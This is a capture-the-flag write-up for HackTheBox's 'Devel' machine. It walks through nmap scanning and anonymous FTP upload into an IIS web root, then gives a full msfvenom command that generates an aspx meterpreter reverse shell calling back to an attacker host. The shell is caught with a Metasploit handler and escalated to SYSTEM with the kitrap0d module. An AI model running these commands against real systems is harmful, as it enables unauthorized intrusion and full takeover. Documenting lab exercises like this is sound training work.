# **Description**

Hello hackers, I hope you are doing well. We are doing [Devel](https://app.hackthebox.com/machines/Devel) from [HackTheBox](https://www.hackthebox.com). The Box is running an FTP server with anonymous login allowed on the webserver's root directory, we upload a revere shell to the ftp server and get foothold. We use exploit suggester module to find another module that gives us SYSTEM privilege.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.5
Host is up (0.12s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd

|_http-server-header: Microsoft-IIS/7.5
| http-methods:

```

Nmap reveals that the target is a windows machine with two open port. Port 21 is running FTP with anonymous login allowed, and port 80 running Microsoft http web server.

## Web

Let's check the web server.

![](1.png)

The website is displaying the welcome page for `IIS`. 

Running a directory scan doesn't reveal much except for a directory that we can't access.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.5/ | tee scans/gobuster                                                    130 тип

===============================================================

```

## FTP

Let's move to the ftp server and login as `anonymous`.

```terminal
$ ftp 10.10.10.5   
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:sirius): anonymous

230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 

```

After logging in successfully and listing the content of the ftp server, we see what looks like the files of the web server we visited earlier, that means we're in the root directory of the website.  

# **Foothold**

Let's see if we can upload file to the ftp server.

![](2.png)

We managed to upload the file, now if we navigate to it in the browser we can see it's content.

![](3.png)

The next thing we need to do is upload a reverse shell, but first let's generate one using `msfvenom`.

## MSFVenom

The payload we are going to generate is a aspx file (Active Server Pages), which is Microsoft's server-side scripting language and engine for dynamic web pages, like `php`.

We use the following command to generate the reverse shell.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f aspx -o shell.aspx
```

 - -p : Payload to use.
 - LHOST : Local host/Attacking machine IP.
 - LPORT : Listening port.
 - -f : Output format.
 - o : File where to save the payload.

```terminal
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of aspx file: 3641 bytes
Saved as: shell.aspx

```

Now let's login the the FTP server and put it there.

![](4.png)

## Metasploit

Now let's fire up metasploit, use the `multi/handler` module and set the following options.

```
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 9999
```

![](5.png)

After setting the options above and running the module, we request the file and receive the reverse shell.

# **Privilege Escalation**

For this part, we can use `exploit_suggester` module that would give us modules to try to upgrade to system privilege.

After some trial and error, the module `ms10_015_kitrap0d` succeeds in giving us a SYSTEM shell.
